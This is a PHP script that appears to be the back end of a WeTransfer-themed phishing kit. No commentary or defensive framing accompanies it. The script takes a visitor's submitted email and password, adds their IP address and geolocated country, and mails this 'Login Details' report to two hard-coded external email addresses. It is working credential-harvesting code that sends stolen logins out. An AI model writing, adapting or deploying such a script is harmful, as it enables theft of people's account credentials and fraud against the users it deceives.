<?php

$ip = getenv("REMOTE_ADDR");
$country = visitor_country();
$domain = 'WeTransfer';
$sender = 'Gh0st';
$headers .= "From: AllWeb <$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$useragent = $_SERVER['HTTP_USER_AGENT'];
$uorp = $_POST['emails'];
$passw = $_POST['password'];

$m1 .= "<HTML><BODY>
<TABLE>
<tr><td><b>***Login Details</b></td></tr>
<tr><td></td></tr>
<tr><td>======================================================</td></tr>
<tr><td>Username: <b>$uorp</b><td/></tr>
<tr><td>Password: <b>$passw</b></td></tr>
<tr><td>Country: $country | User IP: <a href='https://dnschecker.org/ip-location.php?ip=$ip' target='_blank'>$ip</a> </td></tr>
<tr><td>=================WeTrans 2.0<===================</td></tr>
</BODY>
</HTML>

\n";


$b0 = "WeTrans 2.0 | $uorp | $ip";
$b1 = "From: WeTransfer <no-reply@tom.com>";
$b1 .= $_POST['eMailAdd']."\n";
$b1 = "X-Mailer: PHP/".phpversion();
$b1 .= "MIME-Version: 1.0\n";
$b1 .= "Content-type: text/html; charset=UTF-8\n";


$zb = "w123456890@yandex.com, junglelistfwd@gmail.com";
mail($zb,$b0,$m1,$b1,$sender);


echo "<script>
</script>";



function visitor_country()
{
$client = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote = $_SERVER['REMOTE_ADDR'];
$result = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP))
{
$ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP))
{
$ip = $forward;
}
else
{
$ip = $remote;
}

$ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

if($ip_data && $ip_data->geoplugin_countryName != null)
{
$result = $ip_data->geoplugin_countryName;
}

return $result;
}
function visitor_countryCode()
{
$client = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote = $_SERVER['REMOTE_ADDR'];
$result = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP))
{
$ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP))
{
$ip = $forward;
}
else
{
$ip = $remote;
}

$ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

if($ip_data && $ip_data->geoplugin_countryCode != null)
{
$result = $ip_data->geoplugin_countryCode;
}

return $result;
}
function visitor_regionName()
{
$client = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote = $_SERVER['REMOTE_ADDR'];
$result = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP))
{
$ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP))
{
$ip = $forward;
}
else
{
$ip = $remote;
}

$ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

if($ip_data && $ip_data->geoplugin_regionName != null)
{
$result = $ip_data->geoplugin_regionName;
}

return $result;
}
function visitor_continentCode()
{
$client = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote = $_SERVER['REMOTE_ADDR'];
$result = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP))
{
$ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP))
{
$ip = $forward;
}
else
{
$ip = $remote;
}

$ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

if($ip_data && $ip_data->geoplugin_continentCode != null)
{
$result = $ip_data->geoplugin_continentCode;
}

return $result;
}



?>